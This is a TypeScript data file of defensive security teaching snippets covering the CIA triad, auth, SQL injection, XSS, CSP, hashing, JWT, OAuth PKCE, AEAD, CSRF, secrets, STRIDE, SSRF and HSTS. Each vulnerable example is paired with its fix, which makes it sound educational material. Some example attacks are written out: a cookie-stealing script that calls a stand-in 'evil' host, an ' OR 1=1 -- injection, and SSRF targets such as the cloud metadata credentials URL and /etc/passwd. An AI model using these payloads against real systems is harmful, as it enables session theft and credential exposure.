import type { Snippet } from "./types";

export const securitySnippets: Snippet[] = [
  {
    id: "sec-cia-triad",
    language: "security",
    title: "CIA triad — three properties",
    tag: "concepts",
    code: `// Three properties that classify most security work:
//
// Confidentiality — only authorized parties can read.
//   Mitigations: TLS, encryption at rest, access control.
//
// Integrity — data wasn't tampered with.
//   Mitigations: HMAC, signatures, audit logs, code signing.
//
// Availability — legitimate users can access it when needed.
//   Mitigations: redundancy, rate limiting, DDoS protection.
//
// Most threats target one or more legs. Map the threat first;
// the right mitigations follow.

// Examples:
//   "Eavesdropping on traffic"     -> C  -> TLS
//   "Modifying an order's price"   -> I  -> signed mutations
//   "DDoSing the login service"    -> A  -> rate limiting at edge`,
    explanation:
      "Useful frame for triaging incidents and designing defenses. Real systems balance the legs — over-optimizing one often costs another.",
  },
  {
    id: "sec-authn-vs-authz",
    language: "security",
    title: "AuthN vs AuthZ — two questions",
    tag: "auth",
    code: `// Authentication (AuthN) — who are you?
//   Verified by passwords, MFA, OAuth/OIDC, biometrics.
//
// Authorization (AuthZ) — what are you allowed to do?
//   Decided by RBAC, ACLs, policy engines, ownership checks.
//
// Most "auth bugs" in production are actually AuthZ bugs —
// letting an authed user do something they shouldn't.
//
// Always re-check authorization on every privileged operation:

@route.put("/posts/<id>")
def update_post(id):
    user = current_user()                # AuthN — who?
    post = db.posts.find(id)
    if not post:
        return abort(404)
    if post.author_id != user.id and not user.is_admin:
        return abort(403)                # AuthZ — allowed?
    ...`,
    explanation:
      "Two distinct questions. Login once = AuthN; permissions per request = AuthZ. Don't trust client-side checks for either.",
  },
  {
    id: "sec-sql-injection",
    language: "security",
    title: "SQL injection — and the fix",
    tag: "owasp",
    code: `# ❌ Vulnerable — user input concatenated into SQL.
def find_user(name):
    sql = f"SELECT * FROM users WHERE name = '{name}'"
    return db.execute(sql).fetchall()

# Attacker passes:  ' OR 1=1 --
# Final SQL:         SELECT * FROM users WHERE name = '' OR 1=1 --'
# -> returns every user

# ✅ Safe — parameterized query. Driver binds 'name' as DATA, never as SQL.
def find_user(name):
    return db.execute(
        "SELECT * FROM users WHERE name = ?", (name,)
    ).fetchall()

# Don't sanitize-by-stripping. Escape rules vary by DB / charset / context —
# attackers find edges. Parameterized queries are the only safe answer.`,
    explanation:
      "Decades old, still common. Parameterized queries (placeholders) are non-negotiable. ORMs default to safe; raw SQL needs care.",
  },
  {
    id: "sec-xss",
    language: "security",
    title: "XSS — output encoding",
    tag: "owasp",
    code: `# ❌ Vulnerable — user input dropped raw into HTML
@route.get("/search")
def search():
    q = request.args["q"]
    return f"<h1>Results for {q}</h1>"

# Attacker visits:
# /search?q=<script>fetch('https://evil/?c='+document.cookie)</script>
# -> script runs in the victim's browser; cookies exfiltrated

# ✅ Safe — escape output
from markupsafe import escape

@route.get("/search")
def search():
    q = request.args["q"]
    return f"<h1>Results for {escape(q)}</h1>"

# Frameworks (React, Vue, Angular) escape by default in templates.
# Use <textContent> or {value} — NOT innerHTML / dangerouslySetInnerHTML
# with untrusted data.`,
    explanation:
      "Treat user input as data, never as code. Frameworks default to escaping; explicit raw-HTML APIs are where things go wrong.",
  },
  {
    id: "sec-csp",
    language: "security",
    title: "Content Security Policy (CSP)",
    tag: "owasp",
    code: `// Defense-in-depth header that limits what the browser will execute,
// even if XSS slips through escaping.

// Strong baseline:
Content-Security-Policy:
  default-src 'self';
  script-src  'self' 'nonce-RANDOM_PER_REQUEST';
  style-src   'self' 'unsafe-inline';
  img-src     'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';      // = X-Frame-Options DENY (clickjacking)
  base-uri    'self';

// In your HTML:
<script nonce="RANDOM_PER_REQUEST">/* legitimate inline */</script>
// Injected scripts lack the per-request nonce — browser refuses to run them.

// Start with Content-Security-Policy-Report-Only to find what breaks
// before enforcing.`,
    explanation:
      "CSP is layered defense. Output encoding stops XSS at the input; CSP stops it from doing damage if escaping fails.",
  },
  {
    id: "sec-password-hash",
    language: "security",
    title: "Password hashing — bcrypt / argon2id",
    tag: "crypto",
    code: `# ❌ WRONG — fast hash, no salt. Rainbow tables eat you for breakfast.
import hashlib
hashlib.sha256(b"hunter2").hexdigest()

# ✅ bcrypt — slow, salted, work-factor tunable
import bcrypt
hashed = bcrypt.hashpw(b"hunter2", bcrypt.gensalt(12))   # work factor 12
bcrypt.checkpw(b"hunter2", hashed)        # True

# ✅ argon2id — modern recommendation (won the Password Hashing Competition)
from argon2 import PasswordHasher
ph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)
hashed = ph.hash("hunter2")
ph.verify(hashed, "hunter2")              # raises on mismatch

# Tune work factor so each hash takes ~100ms on your server.
# As hardware gets faster, RAISE the work factor.`,
    explanation:
      "SHA is too fast — attackers brute-force billions/sec on GPUs. Use slow, salted, memory-hard password-specific hashes.",
  },
  {
    id: "sec-jwt-structure",
    language: "security",
    title: "JWT structure",
    tag: "auth",
    code: `// Three base64url-encoded parts separated by dots:
//
//   header  .  payload  .  signature
//
// Example:
// eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9
//   .eyJzdWIiOiJ1XzEiLCJleHAiOjE3MDB9
//   .signature_bytes
//
// Header  (decoded): { "alg": "RS256", "typ": "JWT" }
// Payload (decoded): { "sub": "u_1", "exp": 1700... }
// Signature: HMAC (HS256) or asymmetric (RS256/ES256/Ed25519) over header.payload
//
// Verifying = recompute signature with the secret/public key and compare.
//
// CAUTION: never trust the payload BEFORE verifying the signature.
// Decoding != verifying. Always use a library; don't roll your own.`,
    explanation:
      "Self-contained credential. The signature is the trust mechanism — decode-without-verify is how naive code gets bypassed.",
  },
  {
    id: "sec-oauth-pkce",
    language: "security",
    title: "OAuth Authorization Code + PKCE",
    tag: "auth",
    code: `# Modern recommended flow for SPAs and mobile (RFC 7636).
#
# 1. Client generates a random code_verifier (large, secret).
#    Computes code_challenge = SHA256(code_verifier), base64url.
#
# 2. Redirect user to authorization server:
#    GET /authorize?
#      response_type=code&
#      client_id=...&
#      redirect_uri=...&
#      scope=openid profile&
#      state=<random>&
#      code_challenge=<challenge>&
#      code_challenge_method=S256
#
# 3. User authenticates and approves. Auth server redirects back:
#    /callback?code=<code>&state=<random>
#
# 4. Client POSTs to /token with the code AND the original code_verifier:
#    Auth server checks SHA256(code_verifier) == stored code_challenge
#    -> issues access_token (+ id_token, refresh_token).
#
# PKCE protects against authorization-code interception on devices that
# can't keep a client secret (mobile, browsers).`,
    explanation:
      "PKCE makes Authorization Code safe for clients without a server secret. Use it for SPAs, mobile apps, and most modern web apps.",
  },
  {
    id: "sec-aead",
    language: "security",
    title: "Authenticated encryption (AEAD)",
    tag: "crypto",
    code: `from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

# AEAD = Authenticated Encryption with Associated Data.
# Provides confidentiality AND integrity in one operation.
# Modern AEAD ciphers: AES-GCM, ChaCha20-Poly1305.

key = AESGCM.generate_key(bit_length=256)   # 32 bytes
nonce = os.urandom(12)                      # 12 bytes; never reuse with same key
aesgcm = AESGCM(key)

# 'associated_data' isn't encrypted but IS authenticated — bind context
# (key version, content type) so a ciphertext can't be replayed in another.
ct = aesgcm.encrypt(nonce, b"secret message", b"context_v1")

# Decrypt — fails (raises) if anything was tampered.
pt = aesgcm.decrypt(nonce, ct, b"context_v1")
print(pt)   # b"secret message"

# CRITICAL: never reuse a nonce with the same key. AES-GCM is catastrophically
# broken under nonce reuse — keystream is recovered.`,
    explanation:
      "Always prefer AEAD over plain encryption. Encrypt-then-MAC by hand is a tarpit; vetted AEAD libraries get you safe defaults.",
  },
  {
    id: "sec-csrf",
    language: "security",
    title: "CSRF — cross-site request forgery",
    tag: "owasp",
    code: `// Attack: malicious site causes the user's BROWSER to submit a request
// to your site, leveraging the cookies your site already set.
//
// Defenses (any one is usually enough; layer them for robustness):
//
// 1. SameSite cookies — modern default for many cookies:
//    Set-Cookie: session=...; SameSite=Lax; Secure; HttpOnly
//    Browser won't send the cookie on cross-site requests.
//
// 2. CSRF tokens — random per-session token, included in forms:
//    <input type="hidden" name="csrf_token" value="...">
//    Server verifies on every state-changing request.
//
// 3. Re-auth for sensitive actions (transfer money, change email).
//
// 4. Double-submit cookie pattern — token in BOTH a cookie and a form
//    field; server checks they match.

// API-only services using JWT in Authorization header (NOT cookies)
// are largely immune — CSRF rides on auto-sent cookies.`,
    explanation:
      "CSRF abuses the browser's auto-cookie behavior. SameSite=Lax neutralizes most of it; CSRF tokens cover the rest.",
  },
  {
    id: "sec-secrets-mgmt",
    language: "security",
    title: "Secrets — where they belong",
    tag: "ops",
    code: `# DON'T:
#   - Commit secrets to source control. (Git history is forever; private repos leak.)
#   - Bake them into Docker images.
#   - Print them in logs / error pages.
#   - Store in client-side code or browser localStorage.
#
# DO:
#   - Inject as environment variables at runtime:
import os
api_key = os.environ["STRIPE_API_KEY"]    # required, fail fast on missing

#   - Use a secret manager for rotation + audit:
#     AWS Secrets Manager, GCP Secret Manager, HashiCorp Vault.
#   - Use service identity (IAM roles, Workload Identity) — eliminate
#     long-lived credentials entirely.
#   - Scan repos for accidentally-committed secrets:
#     trufflehog, gitleaks. Most CI providers have built-in scanners.

# Rotate periodically. Have a "we leaked a secret" playbook BEFORE you need it.`,
    explanation:
      "The most common breach root cause is a leaked secret in a public repo or paste. Inject at runtime; never commit.",
  },
  {
    id: "sec-stride",
    language: "security",
    title: "STRIDE threat modeling",
    tag: "process",
    code: `# Microsoft's framework. Walk every component / data flow through six categories.
# For each that applies, name a mitigation.

# Spoofing identity              -> AuthN, MFA, signed requests
# Tampering with data            -> TLS in transit, HMAC, signatures
# Repudiation                    -> audit logs, immutable history
# Information disclosure          -> access control, encryption at rest, EXIF strip
# Denial of service              -> rate limit, quotas, autoscale
# Elevation of privilege          -> input validation, least privilege, sandbox

# Example walkthrough — file upload endpoint:
#   S: require AuthN (JWT)
#   T: TLS in transit; verify content-type vs magic bytes
#   R: audit log who uploaded what; immutable storage
#   I: strip EXIF; signed URLs for download; ACLs on bucket
#   D: 25 MB size limit; rate limit per user; quota
#   E: validate file type; antivirus scan; serve from cookie-less origin`,
    explanation:
      "Cheap, surprisingly effective. Walk every STRIDE letter for each component — the gaps you find that way are the bugs you don't ship.",
  },
  {
    id: "sec-ssrf",
    language: "security",
    title: "SSRF — server-side request forgery",
    tag: "owasp",
    code: `# Server fetches a URL controlled by the user. Attacker points it at INTERNAL
# resources the server can reach but they can't.
#
# ❌ Vulnerable
@route.post("/preview")
def preview():
    url = request.json["url"]
    r = requests.get(url, timeout=5)        # could be http://169.254.169.254/...
    return r.text

# Attacks:
#   http://169.254.169.254/latest/meta-data/iam/security-credentials/
#       -> AWS metadata service, can leak IAM credentials
#   http://localhost:6379/                  -> Redis on the same host
#   file:///etc/passwd                       -> read local files
#
# ✅ Defenses (defense in depth):
#   - Allowlist target hosts/protocols
#   - Resolve the hostname yourself; reject private IP ranges
#       (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254/16, ::1/...)
#   - Force IMDSv2 on AWS (token-required metadata)
#   - Use a separate egress proxy that filters destinations`,
    explanation:
      "Top-10 OWASP class. Cloud metadata endpoints made it dramatically more dangerous. Allowlist destinations and block link-local ranges.",
  },
  {
    id: "sec-hsts",
    language: "security",
    title: "HSTS — force HTTPS",
    tag: "tls",
    code: `// Strict-Transport-Security tells browsers: "only ever use HTTPS for this domain."
//
// Recommended:
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// - max-age=31536000  = 1 year
// - includeSubDomains = also covers subdomains
// - preload           = candidate for browser-baked-in list at hstspreload.org
//
// CAUTION: HSTS is sticky. Once browsers cache it, you can't serve plain HTTP
// from that domain for max-age. Don't enable preload until you're certain
// you'll never need to serve HTTP again.
//
// First request to your domain is always a risk window. Preload list closes it.`,
    explanation:
      "HSTS prevents downgrade attacks (sslstrip). Set it everywhere; preload list closes the first-visit gap.",
  },
];
